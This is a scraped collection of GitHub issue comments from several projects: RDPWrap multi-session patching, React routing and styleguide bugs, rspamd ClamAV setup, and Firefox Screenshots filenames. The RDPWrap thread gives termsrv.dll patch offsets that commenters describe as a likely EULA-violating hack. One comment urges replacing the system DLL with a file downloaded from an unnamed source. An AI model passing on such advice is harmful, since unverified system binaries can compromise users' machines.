rdpwrap/stascorp/606/451835245,606,"I can't echo the sentiments of this post any more! I'm in exactly the same boat, I always thought RDPWrap was running standalone?!  My ""copy"" is in c!tools\RDPWrap. NO idea it wrote elsewhere, infact I posted on these forums ""what INI file?"" I didn't know it had one. The highest priority should be updating the INI file.    I know, without question that there's an INI file ""out there"" 100% compatible with 168, because I got it nearly 2 weeks ago and it fixed me up. I've set my Windows Update Channel to be slightly slower (as they allow anyhow, only 2 options now?) and hopefully next time this happens, I won't be in the list of bleeding edge users who get done by this - it'll be fixed by the time I'm upgraded. HOWEVER a big bonus SCREW YOU to Microsoft, who never used to ""mess with"" the termserv.dll file back in the old days? Under Windows 7 I don't recall this being ruined / wrecked at all.  Why is it suddenly dying constanmtly under Windows 10? Appreciate the good work but we need to work on a solution which makes this program up to date within I dunno, a week ?   I don't know if we are STILL having users posting ""HELP, it's not working - but we need to fix that. ",,False
rdpwrap/stascorp/606/452187104,606,the solution in issue #611 worked perfectly for my system. ,,False
rdpwrap/stascorp/606/453073288,606,Developer/maintainer doesn't publish a schedule. Check back for updates. ,,False
rdpwrap/stascorp/606/453095510,606,"I have tried this and failed so many times now - I don't know what to do next. I had RDPWrap working for release 1803 with no problems. Updating it for 1809 I can't get it to work. I have tried everything in threads 601, 606 and 611. I have Win10 x64 Home v1809. I used the ini file from the other threads, which people say works rdpwrap.zip I start with it uninstalled.  From an elevated command prompt I run RDPWInst -i -o. Then I ran RDPWInst -w  I did net stop termservice (it wasn't running so did nothing) I replaced the C\Program Files\RDP Wrapper\rdpwrap.ini with the one above. I then started the termservice again net start termservice  It stayed in a state of ""starting"".  I rebooted. The service was still permanently in a state of ""starting""   The only way I can stop it is going into the Task Manager, finding the process and killing it. Nothing obvious in the Event Viewer. I don't understand why I'm finding it so difficult when others aren't and previously I had it working. Can anyone help or have any suggestions?  ",,False
rdpwrap/stascorp/606/453206834,606,"@friend Chris, first find the version of your termsrv.dll (it is in , rightclick it from Explorer)  Next, go to the directory where you installed RDPWrapper (By default it is in ). Check if the INI files does contain the two sections for your version (.168 in my case)♠[10.0.17763.168] [10.0.17763.168-SLInit]C\Program Files\RDP Wrapper`. If you made any changes, restart the service. Note that most of things you do require you to do it as Administrator (or click Yes in the User Account Countrol popup window, if any) ",,False
rdpwrap/stascorp/606/453211508,606,"@friend  sure why you blame Microsoft? They are free to modify their own software at will ;-) Multiple RDP sessions into a Windows10 workstation is not a supported Microsoft scenario. Hence to us it is a matter of keeping up with the changes. Basically it is nothing more than a workaround or hack, and I would not be surprised if it is against the Windows EULA. The fact that so many users find issues in W10 and not W7 is that W7 is more or less stable at this point, whereas W10 is (especially in the preview fast and slow rings) constant improvement. Also I have seen people picking on and even being very rude to the IMHO very clever guy who made this software @friend. A BIG THANK YOU for Stanislav! ",,False
rdpwrap/stascorp/606/453219620,606,"Works for me. Try to add this to c\Program Files\RDP Wrapper\rdpwrap.ini  Last line MUST be empty Dont forget to ""rdpwinst -r"" ;) ",,False
rdpwrap/stascorp/606/453312719,606,"_&gt; &gt; I have tried this and failed so many times now - I don't know what to do next. I had RDPWrap working for release 1803 with no problems. Updating it for 1809 I can't get it to work. I have tried everything in threads 601, 606 and 611. _ Most others are using Win10 Pro vs Home. Quite possible additional tweaks will be needed to accomodate the latter. ",,False
rdpwrap/stascorp/606/453516622,606,"@friend Thanks for the suggestions.  Yes, my termsrv.dll matches yours (except the modified date, which you might expect)   Yes, my in file had those 2 sections, but the first had different offsets than @friend's post (despite others saying it worked for them). I replaced it with the sections from @friend 's post above making sure the last line is empty.  Restarted with RDPWrap -r (elevated cmd prompt) Service is still permanently ""starting"" and not listening. Aargh!  @friend - Yes I am doing it for Win10 Home but that's the point of it. I don't need it for my Win10 Pro machine because that already allows RDP for 1 session, which is all I need. I just need to be able to access my other 2 machines' desktops (1 Pro, 1 Home) from my main system without having to have a KVM switch. ",,False
rdpwrap/stascorp/606/453707979,606,@friend - no challenge on your use case; simply observing what works for most may not be applicable in your situation due to difference in platform. I the past I used rdpwrap on Win 10 Home boxes and appreciated the capability it brought to the table (in violation of the EULA). Good luck. ,,False
rdpwrap/stascorp/606/453752319,606,YES !!! THIS WORKS !!! PLEASE DO NOT FORGET TO WRITE-PROTECT YOUR rdpwrap.ini. Otherwise the tool will download new version that das not contain the needed additional marks like discribed here  newest version rdpwrap Install RDPwrap normaly Download newest rdpwrap.ini (  ) and place it into your rdpwrap install folder add this lines to your rdpwrap.ini   [10.0.17763.165] LocalOnlyPatch.x64=1 LocalOnlyOffset.x64=77941 LocalOnlyCode.x64=jmpshort SingleUserPatch.x64=1 SingleUserOffset.x64=132F9 SingleUserCode.x64=Zero DefPolicyPatch.x64=1 DefPolicyOffset.x64=17F45 DefPolicyCode.x64=CDefPolicy_Query_eax_rcx SLInitHook.x64=1 SLInitOffset.x64=1ABFC SLInitFunc.x64=New_CSLQuery_Initialize [10.0.17763.165-SLInit] bInitialized.x64 =ECAB0 bServerSku.x64 =ECAB4 lMaxUserSessions.x64 =ECAB8 bAppServerAllowed.x64 =ECAC0 bRemoteConnAllowed.x64=ECAC4 bMultimonAllowed.x64 =ECAC8 ulMaxDebugSessions.x64=ECACC bFUSEnabled.x64 =ECAD0  Download this termsrv (  ) replace safely yout termsrv.dll with this new downloaded one write proctect yout rdpwrap.ini in your install folder (that you downlooaded in step 3 and modified in step 4) start update.bat  THAT WORKS 100% on 10.0.17763.165 @friend Team Sdelajte etot malenkij update poshalusta ! Agromnoje spasibo sa vashu rabotu ! ,,False
rdpwrap/stascorp/606/453778362,606,"hey newbie here ) trying to make this work on windows 10 pro 1809 17763.253 I seen a thread was opened already for 17763.253 and was closed  ticket advises this was a duplicate and links to this thread.... doe this mean I can use the fix here or that 1809 17763.253 isn't supported? basically what I'm trying to achieve here is to rdp into my account through my Mac's Microsoft Remote Desktop app while another user is using a different account on the same pc, is this possible? ",,False
rdpwrap/stascorp/606/455378657,606,"Hello, I modified the rdpwrapper.ini file and restarted the terservice, now rdpconf tells me that everything is fine (green listening and supported), but when I try to connect with the remote desktop, it terminates immediately without any error message. It seems that the PC is accepting the connections but it terminates them immediately after. Any help please. ",,False
rdpwrap/stascorp/606/455471714,606,"Thanks @friend , that has now got me to the next stage - it all now shows green and listening. However, I now have the same problem as @friend in that I can't connect from the remote computer. It terminates immediately when trying to connect. I get the same behaviour from the RDPWrap computer itself when using RDPCheck. ",,False
rdpwrap/stascorp/606/455473647,606,"I am busy at the moment, but will answer next week of course. I had the same Problem but got it working. I will answer Thanks Von meinem iPhone gesendet Am 18.01.2019 um 0953 schrieb ChrisH notifications@friend.com&lt;mailtonotifications@friend.com&gt; Thanks @friend , that has now got me to the next stage - it all now shows green and listening. However, I now have the same problem as @friend in that I can't connect from the remote computer. It terminates immediately when trying to connect. I get the same behaviour from the RDPWrap computer itself when using RDPCheck. — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub or mute the thread",,False
rdpwrap/stascorp/606/455476272,606,"Please retry all but WITHOUT the step 5 (so do not replace the termsrv.dll, keep the original one) I remember the problem was about the termsrv.dll !!! Von meinem iPhone gesendet Am 18.01.2019 um 0953 schrieb ChrisH notifications@friend.com&lt;mailtonotifications@friend.com&gt; Thanks @friend , that has now got me to the next stage - it all now shows green and listening. However, I now have the same problem as @friend in that I can't connect from the remote computer. It terminates immediately when trying to connect. I get the same behaviour from the RDPWrap computer itself when using RDPCheck. — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub or mute the thread",,False
rdpwrap/stascorp/606/455488763,606,working with this file - ini_rdpwrap.zip   ,,False
rdpwrap/stascorp/606/455501525,606,Finally working! Thanks @friend - that ini file did the trick (I copied back my original termsrv.dll v168 Home) I don't know what's going on but I tried multiple .ini files which people said were working for .168 and none of them worked till now. ,,False
rdpwrap/stascorp/606/455767840,606,i hav problem with rdp wrap winwer 10.0.17763.195 thx ,,False
rdpwrap/stascorp/606/457390175,606,"@friend, it's now been 7 weeks since this build was reported. INI files to rectify the issue have been available for most of that time. You seem to be still active on general issue admin, just curious as to why you haven't published the updated INI file/s? Is your plan for the future that everyone will download the tool, find it doesn't work and then have to read through issue tickets to teach themselves how to manually patch the INI file? ",,False
rdpwrap/stascorp/606/457394731,606,"I can't believe the INI file hasn't be updated at this URL yet?  is astounding, why has this not been updated? WTF is going on? ",,False
rdpwrap/stascorp/606/457415503,606,"Looking at   I submit to you that this project is dead, either temporarily or permanently, because binarymaster is very active on other projects that seem to interest him more. Looking at  it seems that  is the most active fork of this project and  is supported. I recommend you try out that fork and report back (post a comment here) whether it's worth moving on to greener pastures. ",,False
rdpwrap/stascorp/606/458309713,606,"Thanks @friend, have checked out tmaguire's fork but I can't see where to download the compiled installer and batch files - at  I can only download the source code. Any ideas? ",,False
rdpwrap/stascorp/606/458389661,606,@friend Not sure. I suggest asking the author directly. His email is listed here ,,False
react-native-router-flux/RNRF/2835/291947730,2835,"Version  react-native-router-flux v4.0.0-beta.28 react-native v0.52.1 ## Actual behaviour throw error like below Unhandled JS Exception Error Route 'key0' should declare a screen. For example   import MyScreen from './MyScreen';   ...   key0 {       screen MyScreen,   }   ...    Expected behaviour then I import all business components into the entry file, and combine them into &lt;Router&gt;&lt;/Router&gt; wrap, it works, but I want organize my route in each business module, and export some module files, combine them in entry file finally. sorry i'm not good at English. please give me a hand, I can't thank you any more Steps to reproduce I export some Components from my business modules like below mm01.js (...some imports gose here) export default class MM01 extends Component{   render(){     return (       &lt;Scene key=""myModule01"" initial tabs&gt;           &lt;Scene key=""myModule010"" initial component={MM010}&gt;           &lt;Scene key=""myModule011"" component={MM011}&gt;           &lt;Scene key=""myModule012"" component={MM012}&gt;           &lt;Scene key=""myModule013"" component={MM013}&gt;       &lt;/Scene&gt;     );   } }  mm02.js (...some imports gose here) export default class MM02 extends Component{   render(){     return (       &lt;Scene key=""myModule02""&gt;           &lt;Scene key=""myModule020"" initial component={MM020}&gt;           &lt;Scene key=""myModule021"" component={MM021}&gt;       &lt;/Scene&gt;     );   } }  entry.js like below (...some imports gose here)  class App extends Component {     return (       &lt;Router&gt;           &lt;Scene key=""root""&gt;               &lt;MM01 /&gt;               &lt;MM02 /&gt;           &lt;/Scene&gt;       &lt;/Router&gt;     ); } AppRegistry.registerComponent('rnMbox', () =&gt; App);  ",,False
react-native-router-flux/aksonov/2835/371040152,2835,@friend Did you find a fix? Please help i'm having the same problem. ,,False
react-native-router-flux/aksonov/2835/291947730,2835,"Version  react-native-router-flux v4.0.0-beta.28 react-native v0.52.1 ## Actual behaviour throw error like below Unhandled JS Exception Error Route 'key0' should declare a screen. For example   import MyScreen from './MyScreen';   ...   key0 {       screen MyScreen,   }   ...    Expected behaviour then I import all business components into the entry file, and combine them into &lt;Router&gt;&lt;/Router&gt; wrap, it works, but I want organize my route in each business module, and export some module files, combine them in entry file finally. sorry im not good at english. please give me a hand, I can't thank you any more Steps to reproduce I export some Components from my business modules like below mm01.js (...some imports gose here) export default class MM01 extends Component{   render(){     return (       &lt;Scene key=""myModule01"" initial tabs&gt;           &lt;Scene key=""myModule010"" initial component={MM010}&gt;           &lt;Scene key=""myModule011"" component={MM011}&gt;           &lt;Scene key=""myModule012"" component={MM012}&gt;           &lt;Scene key=""myModule013"" component={MM013}&gt;       &lt;/Scene&gt;     );   } }  mm02.js (...some imports gose here) export default class MM02 extends Component{   render(){     return (       &lt;Scene key=""myModule02""&gt;           &lt;Scene key=""myModule020"" initial component={MM020}&gt;           &lt;Scene key=""myModule021"" component={MM021}&gt;       &lt;/Scene&gt;     );   } }  entry.js like below (...some imports gose here)  class App extends Component {     return (       &lt;Router&gt;           &lt;Scene key=""root""&gt;               &lt;MM01 /&gt;               &lt;MM02 /&gt;           &lt;/Scene&gt;       &lt;/Router&gt;     ); } AppRegistry.registerComponent('rnMbox', () =&gt; App);  ",,False
react-native-router-flux/aksonov/2835/376113387,2835,"@friend  @friend told the fix, Split your scenes to smaller parts if needed ",,False
react-native-router-flux/aksonov/2835/402981467,2835,How to use  to divide routers? ,,False
react-native-router-flux/aksonov/2835/417559185,2835,"Getting the same error as well with beta 31, the v3 method no longer works and the link above throws a  404 error ",,False
react-native-router-flux/aksonov/2835/425080916,2835,is this problem still going on ? ,,False
react-native-router-flux/aksonov/2835/425715332,2835,"seriously ! please don't write packages if you can't maintain them, fix the issues ",,False
react-native-router-flux/aksonov/2835/425715422,2835,v3 and beta are not supported. ,,False
react-styleguidist/styleguidist/1044/339457727,1044,"Hello, tell me please how to remove #! when pagePerSection true ",,False
react-styleguidist/styleguidist/1247/398452934,1247,"Current behavior When trying to build the styleguide with  after  and copying the  example components folder I'm getting this error To reproduce From my fork repository  you will get the error From scratch, inside the repo's folder run Then create  with this content (see #1243) Copy the components from the cra example folder And build it Here is when the error appears Expected behavior After running To have the static files located in the  folder. This already works for the original  example. ",,False
react-styleguidist/styleguidist/1247/454564607,1247,I'm running into this same problem... ,,False
react-styleguidist/styleguidist/1247/454644352,1247,"TLDR put the following add the following dangerouslyupdatewebpackconfig to your  file Root Cause Okay, I've tracked down the problem. With the newer version of  they use  and this is where the ""problem"" comes from. Some of the helper utils in that make some assumptions about the webpack config that are always true for their ""supported"" use cases. This particular problem comes from assuming there is a  property, basically, they are not null checking because in there use cases this is autogenerated if not provided. Styleguidist does take the output webpack config from  and merge it will it's own. Doing addresses most of these types of issues but it expelicitly ignores the output section. Fix The fix for this is that styleguidist should include a  property in the output section of the webpack config using  if present or  if not. I'm happy to submit a PR if @friend or similar are happy with this approach. Workaround until a fix is in you can use the  method to solve this. your  will look something like ",,False
react-styleguidist/styleguidist/1247/454715435,1247,Thanks for the investigation! I have some concerns on passing the app’s path or . Will this work fine when the style guide is deployed to a folder? For example . ,,False
react-styleguidist/styleguidist/1247/454807646,1247,"@friend I'll need to verify but create-react-app ""expects"" this pattern with its config so if you are using their webpack config you should be okay. I dug through all the code paths to figure out what  was getting set to. That said if you needed to change to a different path you could do something like  in your package.json. That said styleguidist could also just offer a config option and then just default to  if nothing is provided. ",,False
react-styleguidist/styleguidist/1247/454819291,1247,Requiring users to add a new config value for something that's already working without isn't an option. Can we pass something like an empty string? ,,False
react-styleguidist/styleguidist/1247/454823120,1247,"I'm not suggesting a required option just the ability to add one if you need since it's dependent on the webpack config you are using. This way instead of having to use  you would just set an optional config called, I don't know, . If the user sets it then we use that otherwise set it to empty string. then in make-webpack-config.js L37-L41 would become ",,False
react-styleguidist/styleguidist/1247/454830755,1247,Again you’re suggesting to introduce an option for a feature that already works out of the box. ,,False
react-styleguidist/styleguidist/1247/454836340,1247,It does not work out of the box with the latest versions of  you have to manaully write a webpack config and you cannot take advantage of the webpack config that ships with the app. it is perfectly acceptable if you do not want to support . please see  #1243 for the work around that allows you to point styleguidist at the webpack config that now ships with . Doing this will allow you to run a development version but will not allow you to build aka the source of this bug ,,False
react-styleguidist/styleguidist/1247/463122425,1247,"I also have this issue,  with the latest  runs ok, but  produces the above error. I agree with @friend, as of today it does not work out of the box. ",,False
react-styleguidist/styleguidist/1247/463604717,1247,"@friend The difference between  and  is the  variable, which is  when using , and  when using . I have found another workaround, that is to set ♠webpackConfig require('react-scripts/config/webpack.config')('development'),styleguide.config.jswebpackEnvdevelopmentReact Developer Tool` does not give any warning on the generated pages. ",,False
react-styleguidist/styleguidist/1247/467434151,1247,"@friend thank you, it works! Not sure what is the implication of always forcing the  config though. ",,False
react-styleguidist/styleguidist/1247/467481444,1247,"@friend you can use my suggested workaround and then you wont be in DEV all the time. I have a fork of a fix that does this for folks. HOWEVER, @friend claims this is not an actually issue and has stoped responding to my comments. ",,False
react-styleguidist/styleguidist/1247/480802181,1247,tada This issue has been resolved in version 9.0.6 tada The release is available on  npm package (@friend dist-tag) GitHub release  Your semantic-release bot packagerocket ,,False
rspamd/vstakhov/1832/256508770,1832,"Classification (Please choose one option)  [ ] Crash/Hang/Data loss [ ] WebUI/Usability [ ] Serious bug [ ] Other bug [ ] Feature [x] Enhancement  Reproducibility (Please choose one option)  [X] Always [ ] Sometimes [ ] Rarely [ ] Unable [ ] I didn’t try [ ] Not applicable  Rspamd version 1.6.4 Operation system, CPU, memory and environment Debian Stretch Description (Please provide a descriptive summary of the issue) The documentation on how to use ClamAV as a malware scanner should be improved. The defaults as defined in  do not work on Debian. The ""clamd"" process by default listens to the socket file /var/run/clamav/clamd.ctl and not on TCP port 127.0.0.13310. A working configuration would be (/etc/rspam.d/local.d/antivirus.conf) clamav {   action = ""reject"";   symbol = ""CLAM_VIRUS"";   type = ""clamav"";   log_clean = true;   servers = ""/var/run/clamav/clamd.ctl""; }  That also requires that the _rspamd user is part of the clamav group to be able to access the control socket. I suggest that this is made clearer. I would also like to suggest that an error is logged if the antivirus backend could not be reached. Such an error should not go unnoticed. Thanks. Steps to reproduce Install rspamd on Debian Stretch. Send a test virus (e.g. eicar.com). See in the logs that the antivirus module does nothing. ",,False
rspamd/vstakhov/1832/328611040,1832,"That's not Rspamd issue. We cannot fit all 100500 Linux distros in the world. Using of Unix sockets is extremely inconvenient because of the mess with permissions/groups and inability to dump traffic. I personally think that using of the unix socket is a very poor default. However, the default documentation clearly says that unix sockets usage is also possible. The errors are also logged properly, you are likely using the default  and clamav thus does not see  in a message itself. This logging part might be improved indeed. ",,False
rspamd/vstakhov/1832/328642062,1832,"Let's just say that the documentation of the antivirus module is very unspecific about what the defaults are. Quote # servers to query (if port is unspecified, scanner-specific default is used)  Without looking at the source code it's unclear what the default may be. Would be nice to put that into the configuration file as a comment for example. IMHO using sockets has pros and cons. The pro is that you don't open up a service for everyone on a host but just for those who you grant access. The con is that it may be harder to use if you get the permissions wrong and that tcpdump isn't working. I don't want to judge the respective distros' approaches. I'm just a stupid ignorant sysadmin who tried hard to get AV scanning working. ) And good documentation and clear error messages help with that. ",,False
rspamd/vstakhov/1832/328773517,1832,Forget about the sockets. I heard you. My point is the defaults are not documented (except in the source code (where the user is not looking)). ,,False
rspamd/vstakhov/1832/328918489,1832,"On Debian 9.... You need to specifiy the TCPAddr localhost TCPSocket 3310 in the clamav.conf so that rspamd can connect to it. And servers = ""127.0.0.13310""; in rspamd antivirus.conf Should work without issue. It is documented in both rspamd and clamav how to set the port/socket. ",,False
rspamd/vstakhov/1832/354663692,1832,"No, but your instructions mislead the user. Is this your intention? If not, then either correct your config example, or remove the example and refer the user to correct instructions ",,False
rspamd/vstakhov/1832/397825707,1832,"Look, if there's multiple, unrelated people coming here explicitly telling you there's documentation issues how big do you think the chance is that you're right in thinking there's no problem? ",,False
rspamd/vstakhov/1832/397827759,1832,Or even 146% as I'm inclined to ignore issues about the documentation without patches. ,,False
rspamd/vstakhov/1832/397831697,1832,It must be nice to be without doubt. You wrote good software. The way you act is why you don't automatically get the patches from everyone. Maybe one day you'll understand. Fare well. ,,False
rspamd/vstakhov/1832/397832849,1832,Your answer doesn't make any sense.  You documentation is wrong. It does not work. ,,False
sass/sass/2507/316755092,2507,"Regarding issue #132 Every language has string interpolation. Add the feature, stop being stubborn. Also in my opinion those who work for 30 years plus get stuck in their own (old) ways and don't like change. @friend . By expressing string interpolation is a bad idea, is just saying all other languages who have implemented it are wrong to do so. Also, closing/disabling comments is a bad form of censorship which goes agains Open-Source ideals. Please reconsider! and change old habits, they are toxic. ",,False
sass/sass/2507/383721558,2507,"Name-calling is not acceptable behavior, nor is attempting to re-open a locked issue. Don't do it again or you will be blocked from the Sass organization. ",,False
screenshots/mozilla-services/4211/304007958,4211,From discourse ,,False
screenshots/mozilla-services/4211/372780566,4211,"This was reported as producing the same name, but testing shows the filenames have a number in them, eg  file.png -&gt; file(1).png -&gt; file(2).png, etc.  I think it's put there by the browser?  So...we're going to close this. ",,False
screenshots/mozilla-services/4211/387219338,4211,"I'm on the latest Firefox 59.0.2, GNOME 3, and I'm experiencing the duplicate filenames issue. Steps to reproduce  Visit a website (e.g. this page on github). Take a screenshot of the visible part of the page. The save dialog appears with the Downloads directory open in it. Change the directory e.g. to Pictures. Save the screenshot. Take another screenshot of the visible part of the same page. The save dialog appears, and it shows the Downloads directory again. As there is no file with this name in this directory, ""(1)"" is not appended. Change directory to Pictures. Try to save the screenshot, and the save dialog warns you that you are trying to overwrite the existing file.  Expected result No filename collision between the screenshots taken at different times. Actual result Screenshots taken at different times have the same filename, and the user is forced to manually rename the file. Additional comments ""(1)"", ""(2)"", etc. are really appended to the filename if you don't change the directory in the save dialog and just save everything to Downloads. But if you want to store the screenshots to a different directory, you are forced to select it manually each time which is annoying, and no ""(1)"", ""(2)"", etc. are appended in this case. The best solution in my opinion is to just include a timestamp (including seconds) in the filename. ",,False
screenshots/mozilla-services/4211/387225997,4211,"@friend Thanks for the feedback. This bug has been closed as a wontfix, sorry. FWIW, on linux, you should be able to use something like  to auto-detect filesystem changes, and automatically rename any files matching the Screenshots initial part to include a local timestamp. I realize this isn't the answer you're after, but at least you can easily hack together a DIY solution plus one ",,False
screenshots/mozilla-services/4211/387237824,4211,Let's take a minute to chill. Locking this issue for now. ,,False
screenshots/mozilla-services/4211/387234967,4211,"ORLY? I can't see any mention of this resolution ITT. What I see is the following which means that the bug is closed as invalid/not reproduced. I suggest the steps to reproduce the bug so that you all could see that it's valid. So why not just follow the steps, reproduce the bug and reopen it, then fix it? It's trivial to fix that little tiny thing that irritates and annoys a lot of users, but instead you suggest some ugly workarounds when it's Firefox Screenshots' job to name the files correctly. Instead of creating the file with the correct name, you suggest creating a file with a wrong name, running a daemon that runs inotify watches and renames them. And I strongly believe that you understand the consequences of that ""solution"" — it's easy enough to get into an inconsistent state, be it a power loss before renaming, or a daemon crash, etc. There is a kind of people who write low-quality bash scripts for everything with hardcoded , race conditions, improper escaping, etc. I'm not one of those people, and I'm not gonna turn my computer into a dump by writing buggy scripts when someone refuses to fix their buggy software. It's too sad to admit that the new Firefox has taken a self-destructive course. Firefox Screenshots demonstrate that perfectly. First half of the extensions is broken including the extension I used to take screenshots. Then Mozilla introduces a built-in screenshotting tool which is, by the way, inferior to the one I used before. And what we see here? A big blue Save button that sends my private data to the cloud instead of saving my screenshots (#3603). Ugly error messages when just following a normal user flow (#3964). Too many clicks to just save a screenshot — it takes me at least 5 clicks just to save a shot of a page when it had taken me only a single click when I used a third-party screenshotter extension. One screenshot a day limit (#4229, #4211). No way to customize the filename pattern (#4229). Doesn't remember the directory where I store all my screenshots (#4211). These all make this piece of software absolutely unusable. These are the real problems, because they break UX. However, from version to version, nothing changes in Firefox Screenshots, still the same problems, still unusable. And the developers just say they are not going to fix that. Firefox Screenshots' fate is sealed. Just like Firefox Hello, it started as a new good useful tool, but it will end up exactly the same way, because it doesn't seem to be developed any more. I beg my pardon for possibly rude voice, but I'm seriously concerned about my favorite browser's future, and such responses from the developers are no good sign. ",,False
sentry-elixir/getsentry/282/336385490,282,"By specifying the below you are saying that for all combinations of software on which Elixir runs, your software runs. However, we already know that this isn't the case, because of existing (unresolved) bug reports related to parallel compilation; bugs your team has not addressed in an efficient or effective manner, I should add. So, before I will actually try to debug anything, I would like to hear from you -- the vendor -- what the dependencies actually are to make this work on generic Linux. Preferably I would like to see this fully automated in a script of some kind named . This script would check for the operating system, libraries on which it depends (which you have done partially, I believe already), OTP versions, etc. The script should output either an exit status of 0 signifying that a subsequent compile is guaranteed to work or an exit status of 1 when the system configuration is not OK with a list of errors of what's wrong. ",,False
sentry-elixir/getsentry/282/400836238,282,"In the future please link to the issues and errors that you are having. I understand you are having trouble and this is a very annoying bug. You must understand how hard it is to fix an issue when its not easy to reproduce your self. The issue as presented is not a productive way to interact with any human being. It turns out that this is a bug in the Elixir Compiler and is being fixed for elixir 1.7.  issue is with how deps are being reported to sentry, the only fix at the moment would remove dep's from being reported at all until mix is fixed. We're discussing possible options and should have a fix out soonish. ",,False
sentry-elixir/getsentry/282/401079864,282,This should temporarily fix the issue. ,,False
silverstripe-framework/silverstripe/7761/288780107,7761,"SS4.0 TextFieldcreate(&lt;name&gt;, &lt;value&gt;) OK HiddenFieldcreate(&lt;name&gt;, &lt;value&gt;) NOT OK. HiddenFieldcreate(&lt;name&gt;)-&gt;setValue(&lt;value&gt;) There is not reason to trip up new developers like this ",,False
silverstripe-framework/silverstripe/7761/357897324,7761,"@friend Can you provide more info on what specifically you expect to happen vs what’s actually happening? The second argument should be the title (that is, the “label” used when the field is displayed) - the third argument is for value - is that what’s causing your issue? It is a little strange to push a title to a  when that title will never be displayed, but it keeps that API (slightly) more consistent with other form field types ) ",,False
silverstripe-framework/silverstripe/7761/357907773,7761,"Your examples are wrong.  objects are ♠FormFieldcreate(&lt;name&gt;, &lt;label&gt;, &lt;value&gt;)` see ",,False
silverstripe-framework/silverstripe/7761/358108717,7761,No.  FormField from  that pattern for a hiddeen field does not work in the template as Results in ,,False
silverstripe-framework/silverstripe/7761/358109888,7761,@friend that all looks as expected... if you add and you'll get output ,,False
silverstripe-framework/silverstripe/7761/358110254,7761,The bug is that the interface for a text field and a hidden field are different.  IMO They should be the same. ,,False
silverstripe-framework/silverstripe/7761/358110510,7761,"can you explain in what way they are different, please? ",,False
silverstripe-framework/silverstripe/7761/358110678,7761,"TextFieldcreate(&lt;name&gt;, &lt;value&gt;); // OK HiddenFieldcreate(&lt;name&gt;, &lt;value&gt;); // NOT OK. ",,False
silverstripe-framework/silverstripe/7761/358111475,7761,"@friend - I'm sorry, you're not being clear. both of those work, don't result in error, output expected HTML/fields. Form what I can tell you actually are asking for these APIs to be different, not the same... You'd like 's second constructor argument to be the value and not the label, is that right? ",,False
silverstripe-framework/silverstripe/7761/358112053,7761,They produce different output. See above where I created an example and cut and pasted resulting HTML. ,,False
silverstripe-framework/silverstripe/7761/358112899,7761,"That is expected, the two examples you're giving are fundamentally different In the above code,  has no value set and just a name and label,  has a name and no label and a value is set. Therefore you'd expect different output and the output you've shown looks expected.  has no value and  does. ",,False
silverstripe-framework/silverstripe/7761/358117341,7761,No. produces produces Those are different. ,,False
silverstripe-framework/silverstripe/7761/358117694,7761,The second argument to the FormField is the value not a label according to the API documentation.  As I read it ,,False
silverstripe-framework/silverstripe/7761/358118266,7761,"Worik, sorry mate... I think you're confusing Title (ie. html ) and Value (ie. html attribute ). This is true for virtually every form field. Perhaps if you can provide a link to the documentation you're reading specifically, and what it is that has you turned around from it? ie. suggestions on how it could be clearer? Maybe the wording is a bit confusing. ",,False
silverstripe-framework/silverstripe/7761/358120285,7761,"I am showing you code I have been implementing. On close examinatuion the second argument for TextField constructor chould be 'Title' BUT, having missed that, I passed a value as the second argument to create(..) and hey presto it is the value.  Doing exactly the same pattern for HiddenField resulte in a different output. That is a bug.  I have reproduced it Ad nauseam Perhaps the TextFiled interface is buggy, I do not know,. it is the way it is used in the lessons, perhaps they are buggy too.  I do not know. But I do know this The interfaces to the HiddenField and TextField's create method are different when they should be the same. I have made that clear in examples above.  It is bnot a hypothesis but an observation. It may not seem like a bug to have idiosyncratic interfaces, but it makes life very difficult for new comers to the platform ",,False
silverstripe-framework/silverstripe/7761/358120727,7761,Test 1 Creates Test 2 Creates ,,False
silverstripe-framework/silverstripe/7761/358122690,7761,"@friend Is this SilverStripe 4.0? Lets step through it together ) public function __construct($name, $title = null, $value = '', $maxLength = null, $form = null)FormFieldHiddenField`. You can see this here ",,False
silverstripe-framework/silverstripe/7761/358125941,7761,"Whatever.  That is all nice theory.  But the facts, here are that the interfaces differ.  SS4.0 ",,False
silverstripe-framework/silverstripe/7761/358127332,7761,"I'm going to lock this topic, since it looks as if the original question has been answered adequately and the discussion seems to be degrading. Please keep in mind the SilverStripe code of conduct when contributing and responding to bug reports. Thanks =) ",,False
silverstripe-framework/silverstripe/7761/358130059,7761,@friend how about we catch up  on slack ) ,,False
spring-cloud-sleuth/spring-cloud/991/326388352,991,&lt;dependencyManagement&gt;         &lt;dependencies&gt;             &lt;dependency&gt;                 &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;                 &lt;artifactId&gt;spring-cloud-sleuth&lt;/artifactId&gt;                 &lt;version&gt;2.0.0.RC1&lt;/version&gt;                 &lt;type&gt;pom&lt;/type&gt;                 &lt;scope&gt;import&lt;/scope&gt;             &lt;/dependency&gt;         &lt;/dependencies&gt;     &lt;/dependencyManagement&gt;     &lt;dependencies&gt;         &lt;dependency&gt;             &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;             &lt;artifactId&gt;spring-cloud-starter-sleuth&lt;/artifactId&gt;         &lt;/dependency&gt;         &lt;dependency&gt;             &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;             &lt;artifactId&gt;spring-cloud-sleuth-zipkin&lt;/artifactId&gt;         &lt;/dependency&gt;         &lt;dependency&gt;             &lt;groupId&gt;io.zipkin.brave&lt;/groupId&gt;             &lt;artifactId&gt;brave-instrumentation-mysql&lt;/artifactId&gt;             &lt;version&gt;4.13.1&lt;/version&gt;         &lt;/dependency&gt;         &lt;dependency&gt;             &lt;groupId&gt;mysql&lt;/groupId&gt;             &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;         &lt;/dependency&gt;         &lt;dependency&gt;             &lt;groupId&gt;io.zipkin.brave&lt;/groupId&gt;             &lt;artifactId&gt;brave-mysql&lt;/artifactId&gt;             &lt;version&gt;4.0.6&lt;/version&gt;         &lt;/dependency&gt; &lt;/dependencies&gt;  ,,False
spring-cloud-sleuth/spring-cloud/991/391947994,991,if you want us to help you have to stop re-opening issues and use gitter instead ok?   issues can cause some annoyance. you were asked to not open an issue and did it again. Moreover you opened an issue after already creating this one.. please don't behave like this as we want to help but it is hard when annoyed ok? ,,False
spring-cloud-sleuth/spring-cloud/991/391948579,991,"This problem has not been dealt with completely, you close, this behavior is too responsible, the first use of this, can not be more patient? ",,False
